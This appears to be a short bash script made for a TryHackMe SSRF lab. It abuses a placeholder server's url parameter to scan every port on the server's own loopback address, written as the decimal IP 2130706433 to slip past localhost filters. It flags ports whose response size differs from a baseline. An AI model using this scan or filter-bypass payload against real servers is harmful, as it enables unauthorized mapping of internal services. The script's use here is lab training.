<!-- This file is build for the THM SSRF Lab and will "curl" the 
site and test for any open ports.

To use this 
change the URL and if needed the port. Then copy and paste into the bash commandline and it will start.

Be patient. It might take a bit depending on your system.
 -->


for x in {1..65535};
    do cmd=$(curl -so /dev/null http://x.x.x.x:8000/attack?url=http://2130706433:${x} \
        -w '%{size_download}');
    if [ $cmd != 1045 ]; then
        echo "Open port: $x"
    fi
done

